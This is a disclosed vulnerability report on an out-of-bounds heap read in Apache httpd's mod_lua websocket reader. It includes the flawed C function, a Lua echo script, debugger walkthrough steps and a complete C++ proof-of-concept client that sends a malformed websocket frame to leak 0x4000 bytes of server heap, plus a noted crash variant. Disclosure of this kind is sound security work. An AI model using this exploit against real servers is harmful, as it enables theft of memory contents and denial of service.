# Controllable read beyond bounds in lua_websocket_readbytes() [zhbug_httpd_126]

## Report Details
- **Report ID**: 1595290
- **URL**: https://hackerone.com/reports/1595290
- **State**: Closed
- **Severity**: low
- **Submitted**: 2022-06-08T23:02:12.130Z
- **Disclosed**: 2022-07-09T13:45:57.547Z

## Reporter
- **Username**: tdp3kel9g
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: ibb

## Vulnerability Information
Greetings. I have found a read-beyond-bounds bug in lua_websocket_readbytes() that permits an attacker to exfiltrate a controllable amount of heap data if the victim site runs a suitable LUA program.

The bug is due to misuse of ap_get_brigade() and apr_bucket_read(). The following code (from v2.4.53) assumes that ap_get_brigade(...readBytes) and ap_bucket_read(...len,...) return |readBytes| or |len| bytes on success return when used in AP_MODE_READBYTES/APR_BLOCK_READ mode, respectively. This idea is false, and causes line 2242, below, to return the address of a buffer |data| that is likely to be shorter than |len|. Line 2244 then copies |len| bytes of |data|, including some number of beyond-bounds bytes, into |buffer|. A suitable LUA program can then be abused to return this |buffer| to an attacker.

The bug is still present in trunk.
```
   2230: static apr_status_t lua_websocket_readbytes(conn_rec* c, char* buffer,
   2231:         apr_off_t len)
   2232: {
   2233:     apr_bucket_brigade *brigade = apr_brigade_create(c->pool, c->bucket_alloc);
   2234:     apr_status_t rv;
   2235:     rv = ap_get_brigade(c->input_filters, brigade, AP_MODE_READBYTES,
   2236:             APR_BLOCK_READ, len);
   2237:     if (rv == APR_SUCCESS) {
   2238:         if (!APR_BRIGADE_EMPTY(brigade)) {
   2239:             apr_bucket* bucket = APR_BRIGADE_FIRST(brigade);
   2240:             const char* data = NULL;
   2241:             apr_size_t data_length = 0;
   2242:             rv = apr_bucket_read(bucket, &data, &data_length, APR_BLOCK_READ);
   2243:             if (rv == APR_SUCCESS) {
   2244:                 memcpy(buffer, data, len);
   2245:             }
   2246:             apr_bucket_delete(bucket);
   2247:         }
   2248:     }
   2249:     apr_brigade_cleanup(brigade);
   2250:     return rv;
   2251: }
```
Attached is a POC that demonstrates the bug. It creates a TLS connection to httpd, asks to upgrade the connection to websocket, then sends a websocket frame that purports to transfer `0x4000` bytes of payload to `/bug126/bug126.lua` on httpd. However, the frame does not actually include any payload. The LUA program simply does a websocket upgrade, then reads and echoes whatever data it obtains. Because of the bug, what it obtains (and echoes to the POC program) is `0x4000` bytes of beyond-bounds heap.

Use the POC thusly:

   1. Enable LUA on an httpd server.
   2. Copy bug126.lua to bug126/bug126.lua on the httpd server.
   3. Edit |SERVER_NAME| in httpd_wsclient.cpp to contain the DNS name/IP address of the server.
   4. Edit the certificate file path on httpd_wsclient.cpp line 130 to something appropriate for the certs your httpd server uses.
   5. Edit the "host" header line on httpd_wsclient.cpp line 153 appropriately for your httpd server.
   6. Build httpd_wsclient.cpp against OpenSSL 1.1.x.
   7. Attach a debugger to httpd and set a BP on line 2233, above.
   8. Start httpd_wsclient and set a BP on line 179, on the |while (len > 0)| statement.
   9. Continue execution of httpd_wsclient.
   10. You will get several BPs on line 2233. Wait for the one with |len| == 0x4000.
   11. Now step through line 2235 and notice that it returns success.
   12. Step through line 2239 (success) and 2242 (success, |data_length| == 1...oh-oh!).
   13. Now step the memcpy() and watch it copy 0x4000-1 bytes of beyond-bounds heap into |buffer|.
   14. Let httpd proceed.
   15. Now you'll get a BP in httpd_wsclient. Check |len|, which probably will be 0x2000. Look at that many bytes off |recvBuf| and verify that they're data from httpd's heap.
   16. Step the |do| loop again to get another ~0x2000 bytes of httpd heap data.
```
-------- bug126.lua ----------------------------------------------------
function handle(r)
    if r:wsupgrade() then
        local data, isFinal = r:wsread();
        r:wswrite(data);
    end
end
-------- bug126.lua ----------------------------------------------------
```
```
-------- httpd_wsclient.cpp ----------------------------------------------------
#undef UNICODE

#define WIN32_LEAN_AND_MEAN
#define _CRT_SECURE_NO_WARNINGS

#include <windows.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <stdlib.h>
#include <stdio.h>

#include "openssl\ssl.h"


#pragma comment (lib, "Ws2_32.lib")
#pragma warning (disable:6262)
constexpr char SERVER_NAME[] = "127.0.0.1";

void FillBuffer(
    const char *pInput,
    char *pOutput,
    size_t numOutputBytes) {

    char *pEnd = pOutput + numOutputBytes;
    size_t inlen = strlen(pInput);
    while (pOutput < pEnd) {
        size_t numBytes = min(inlen, static_cast <size_t> (pEnd - pOutput));
        memcpy(pOutput, pInput, numBytes);
        pOutput += inlen;
    }
}

int ConnectSocket(const addrinfo* pAddrInfo, SOCKET* pSocket) {
    int iResult;
    *pSocket = socket(pAddrInfo->ai_family, pAddrInfo->ai_socktype, pAddrInfo->ai_protocol);
    if (*pSocket == INVALID_SOCKET) {
        printf("socket failed with error: %ld\n", WSAGetLastError());
        return SOCKET_ERROR;
    }

    iResult = connect(*pSocket, pAddrInfo->ai_addr, static_cast<int>(pAddrInfo->ai_addrlen));
    return iResult;
}

DWORD Send(
    const char* pData,
    size_t     numBytes,
    size_t     numBytesPerBatch,
    SOCKET* pSocket) {

    WSABUF w;
    size_t offset = 0;
    int iResult;

    if (numBytesPerBatch > ULONG_MAX) {
        return ERROR_FILE_TOO_LARGE;
    }

    while (numBytes > 0) {
        ULONG numBatchBytes =
            static_cast<ULONG>(min(numBytes, numBytesPerBatch));
        w.buf = const_cast <char*> (pData) + offset;
        w.len = numBatchBytes;

        DWORD bytesSent = 0;
        iResult = WSASend(*pSocket, &w, 1, &bytesSent, 0, NULL, NULL);
        if (iResult == SOCKET_ERROR) {
            return ERROR_WRITE_FAULT;
        }

        numBytes -= numBatchBytes;
        offset += numBatchBytes;
    }

    return ERROR_SUCCESS;
}

int __cdecl main(void)
{
    WSADATA wsaData;
    int iResult;

    SOCKET serverSocket = INVALID_SOCKET;

    struct addrinfo* result = NULL;
    struct addrinfo hints;

    SSL_CTX *pCtx = NULL;
    SSL     *pSSL = NULL;

// Initialize Winsock

    iResult = WSAStartup(MAKEWORD(2, 2), &wsaData);
    if (iResult != 0) {
        printf("WSAStartup failed with error: %d\n", iResult);
        return 1;
    }

    ZeroMemory(&hints, sizeof(hints));
    hints.ai_family = AF_INET;
    hints.ai_socktype = SOCK_STREAM;
    hints.ai_protocol = IPPROTO_TCP;
//    hints.ai_flags = AI_PASSIVE;

// Resolve the server's address and port

    iResult = getaddrinfo(SERVER_NAME, "443", &hints, &result);
    if (iResult != 0) {
        printf("getaddrinfo failed with error: %d\n", iResult);
        WSACleanup();
        return 1;
    }

    iResult = ConnectSocket(result, &serverSocket);

    if (iResult == SOCKET_ERROR) {
        if (serverSocket != INVALID_SOCKET) {
            closesocket(serverSocket);
        }
        freeaddrinfo(result);
        WSACleanup();
        return 1;
    }

// Create SSL context, etc.

    int e = 0;

    pCtx = SSL_CTX_new(TLS_client_method());
    iResult = SSL_CTX_use_certificate_file(pCtx, "<appropriate cert path>", SSL_FILETYPE_PEM);
    e = SSL_get_error(pSSL, iResult);

    pSSL = SSL_new(pCtx);
    iResult = SSL_set_fd(pSSL, static_cast<int>(serverSocket)); // OpenSSL docs REQUIRE this horrific cast
    e = SSL_get_error(pSSL, iResult);

    SSL_set_connect_state(pSSL);
    e = SSL_get_error(pSSL, iResult);

// Run SSL handshake

    iResult = SSL_connect(pSSL);
    if (iResult == SOCKET_ERROR) {
        e = SSL_get_error(pSSL, iResult);
        closesocket(serverSocket);
        freeaddrinfo(result);
        WSACleanup();
        return 1;
    }

    char req1[] =
        "GET /bug126/bug126.lua HTTP/1.1\r\n"
        "Host: 127.0.0.1\r\n"
        "Accept: */*\r\n"
        "Upgrade: websocket\r\n"
        "Sec-Websocket-Key: aaa\r\n\r\n";

    iResult = SSL_write(pSSL, req1, strlen(req1));


// Receive and throw away the response.

    char recvBuf[65536];
    DWORD len = SSL_read(pSSL, recvBuf, sizeof(recvBuf));

// Now send the bad WS header.

    char req2[] =
        "\x82"    // FIN and binary data
        "\x7f"  // no mask, payload len == 127 (8 byte payload len follows immediately)
        "\x00\x00\x00\x00\x00\x00\x40\x00"; // extract 0x4000 bytes of heap!

    iResult = SSL_write(pSSL, req2, sizeof(req2));

// Now extract the exfiltrated data.

    do {
        len = SSL_read(pSSL, recvBuf, sizeof(recvBuf));
    } while (len > 0);

     closesocket(serverSocket);

// The bug has been triggered. Cleanup and exit.

    freeaddrinfo(result);
    WSACleanup();

    return 0;
}
-------- httpd_wsclient.cpp ----------------------------------------------------
```

## Impact

The attacker could repeatedly exfiltrate an attacker-determined amount of beyond-bounds heap data. The data could contain anything that httpd previously had allocated from heap (unless httpd erased it prior to deallocation, which it does not generally do). By extracting only a modest amount of data per iteration, the attacker likely would not crash httpd, making this attack difficult to detect. In mitigation, the vulnerability requires the victim site to be running an LUA program that somehow echoes the result of `r:wsread()`. The POC just directly echoes it via `r:wswrite()` (which would be most useful to the attacker), but even if the data were transformed in some way (e.g., encoded) or used differently, e.g., by being put into a database, being sent to some other server (likely because websockets is being used), being written to the filesystem, etc., the result is likely to be useful to the attacker.

The attacker also could use this bug to cause DoS by simply requesting a large amount of data, thus likely causing an access violation and consequent crash.

## Attachments
No attachments
